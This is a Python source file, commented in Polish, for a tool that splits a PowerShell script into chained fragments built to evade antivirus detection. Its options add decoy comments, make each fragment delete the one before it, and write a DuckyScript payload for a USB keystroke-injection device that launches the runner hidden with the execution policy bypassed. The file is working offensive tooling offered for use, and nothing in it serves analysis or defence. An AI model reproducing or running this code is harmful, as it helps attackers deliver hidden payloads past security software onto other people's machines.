import os
import argparse
import random
from pathlib import Path

RANDOM_COMMENTS = [
    "# robie kanapke z szynka",
    "# to nie jest malware tylko test",
    "# czy pies lubi zupy?",
    "# poweruser.exe activated",
    "# debug mode: true",
    "# nie dotykac to moj projekt",
    "# bardzo wazna zmienna",
    "# czyszczenie smieci",
    "# pole testowe do zabawy",
    "# sprobuj czegos lepszego av"
]

def parse_args():
    parser = argparse.ArgumentParser(description="Split PowerShell script into AV-evading fragments.")
    parser.add_argument("-i", "--input", required=True, help="Input PowerShell script")
    parser.add_argument("-o", "--output", default="output", help="Output directory")
    parser.add_argument("--chain", action="store_true", help="Make each part call the next one")
    parser.add_argument("--runner", action="store_true", help="Generate runner.ps1")
    parser.add_argument("--comments", action="store_true", help="Add random unrelated comments")
    parser.add_argument("--cleanup", action="store_true", help="Each part deletes the previous one")
    parser.add_argument("--delay", type=int, default=300, help="Delay in ms between calls")
    parser.add_argument("--duckify", action="store_true", help="Generate DuckyScript to launch runner.ps1")
    return parser.parse_args()

def make_output_dir(path):
    os.makedirs(path, exist_ok=True)

def clean_filename(idx):
    return f"line{idx:03d}.ps1"

def shell_split(args):
    with open(args.input, "r", encoding="utf-8") as f:
        raw_lines = [line.rstrip() for line in f if line.strip() != ""]

    make_output_dir(args.output)
    part_files = []

    current_block = []
    open_braces = 0
    close_braces = 0

    blocks = []

    inside_here_string = False
    here_string_delim = None
    inside_try_block = False
    
    
    for line in raw_lines:
        stripped = line.strip().lower()

        if stripped.startswith("try {"):
            inside_try_block = True

        if inside_try_block and (stripped.startswith("catch {") or stripped.startswith("finally {")):
            inside_try_block = False

        if not inside_here_string and ("@'" in line or '@"' in line):
            if "@'" in line:
                inside_here_string = True
                here_string_delim = "'@"
            elif '@"' in line:
                inside_here_string = True
                here_string_delim = '"@'

        elif inside_here_string and here_string_delim in line:
            inside_here_string = False
            here_string_delim = None

        open_braces += line.count("{")
        close_braces += line.count("}")
        current_block.append(line)

        # Tylko dodaj blok jeśli:
        if (
            not inside_here_string
            and open_braces == close_braces
            and not inside_try_block  # 🔥 nie tnij w trakcie try-bloku
        ):
            blocks.append("\n".join(current_block))
            current_block = []
            open_braces = 0
            close_braces = 0



    # jeśli coś zostało niezamknięte, dodaj jako osobny blok
    if current_block:
        blocks.append("\n".join(current_block))

    total = len(blocks)
    for idx, block in enumerate(blocks):
        part_name = clean_filename(idx + 1)
        next_name = clean_filename(idx + 2) if idx + 1 < total else None
        full_path = os.path.join(args.output, part_name)
        part_files.append(part_name)

        with open(full_path, "w", encoding="utf-8") as pf:
            pf.write(block + "\n")

            if args.comments:
                pf.write(f"{random.choice(RANDOM_COMMENTS)}\n")

            if args.chain and next_name:
                pf.write(f". .\\{next_name}\n")
                pf.write(f"Start-Sleep -Milliseconds {args.delay}\n")

            if args.cleanup and idx > 0:
                prev_name = clean_filename(idx)
                pf.write(f'Remove-Item "{prev_name}" -Force\n')

    if args.runner:
        runner_path = os.path.join(args.output, "runner.ps1")
        with open(runner_path, "w", encoding="utf-8") as r:
            r.write("Set-Location $PSScriptRoot\n")
            r.write(". .\\line001.ps1\n")

    if args.duckify:
        duck_path = os.path.join(args.output, "runner-ducky.txt")
        duck_cmd = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "{os.path.abspath(os.path.join(args.output, "runner.ps1"))}"'
        with open(duck_path, "w", encoding="utf-8") as d:
            d.write("DELAY 1500\n")
            d.write("GUI r\n")
            d.write("DELAY 500\n")
            d.write(f"STRING {duck_cmd}\n")
            d.write("ENTER\n")

if __name__ == "__main__":
    args = parse_args()
    shell_split(args)